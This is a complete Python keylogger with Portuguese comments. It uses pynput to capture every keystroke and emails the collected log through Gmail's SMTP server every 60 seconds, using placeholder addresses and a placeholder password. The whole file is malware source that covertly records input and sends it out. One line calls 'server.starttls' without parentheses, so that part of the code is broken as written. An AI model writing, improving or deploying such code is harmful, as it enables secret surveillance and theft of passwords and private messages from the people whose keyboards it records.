from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
}

# Configuração do Email
EMAIL_ORIGEM = "whatever@gmail.com"
EMAIL_DESTINO = "whatever@gmail.com"
SENHA_EMAIL = "senhadoemail"

log = ""

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar: ", e)
    
        log = ""

    #Agendar o envio a cada 60 segundos
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.backspace:
            log += "\b"
        elif key == keyboard.Key.esc:
            log += " [ESC]"
        elif key in IGNORAR:
            pass
        else:
            log += f"[{key}]"

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()